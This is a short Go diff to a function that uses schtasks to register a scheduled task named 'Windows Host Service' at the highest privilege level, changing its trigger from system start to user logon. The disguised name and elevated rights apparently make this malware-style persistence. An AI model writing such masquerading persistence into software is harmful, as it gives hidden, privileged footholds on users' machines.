@@ -418,7 +418,7 @@ func addScheduler() {
 	cmd, err := exec.Command(
 		"schtasks",
 		"/create",
-		"/sc", "ONSTART",
+		"/sc", "ONLOGON",
 		"/tn", "Windows Host Service",
 		"/f",
 		"/rl", "HIGHEST",
